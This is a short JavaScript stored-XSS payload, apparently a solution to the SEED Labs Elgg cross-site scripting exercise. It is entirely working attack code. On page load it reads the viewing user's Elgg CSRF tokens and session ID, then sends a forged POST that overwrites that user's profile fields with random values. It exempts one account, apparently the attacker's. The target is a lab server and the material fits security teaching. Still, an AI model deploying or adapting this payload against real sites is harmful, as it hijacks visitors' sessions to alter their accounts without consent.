<script type="text/javascript">
    window.onload = function() {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

        // random string
        var randomString = Math.random().toString(36).substring(7);
        var accesslevel = 1;
        // Construct the HTTP request to modify victim's profile
        var sendurl = "http://www.seed-server.com/action/profile/edit";

        var content = token + ts + "&name=" + elgg.session.user.name;
        content += "&description=" + randomString;
        content += "&accesslevel[description]="+ accesslevel;
        content += "&briefdescription=1905048";
        content += "&accesslevel[briefdescription]="+ accesslevel;
        content += "&location=" + randomString;
        content += "&accesslevel[location]=" + accesslevel;
        content += "&interests=" + randomString;
        content += "&accesslevel[interests]="+ accesslevel;
        content += "&skills=" + randomString;
        content += "&accesslevel[skills]="+ accesslevel;
        content += "&contactemail=" + randomString+"@gmail.com";
        content += "&accesslevel[contactemail]="+ accesslevel;
        content += "&phone=" + randomString;
        content += "&accesslevel[phone]="+ accesslevel;
        content += "&mobile=" + randomString;
        content += "&accesslevel[mobile]="+ accesslevel;
        content += "&website=http://www." + randomString+".com";
        content += "&accesslevel[website]=" + accesslevel;
        content += "&twitter=" + randomString;
        content += "&accesslevel[twitter]=" + accesslevel;
        content += "&guid=" + elgg.session.user.guid;

        // Create and send the Ajax request to modify victim's profile
        if(elgg.session.user.guid != 59) {
            Ajax = new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Host", "www.seed-server.com");
            Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
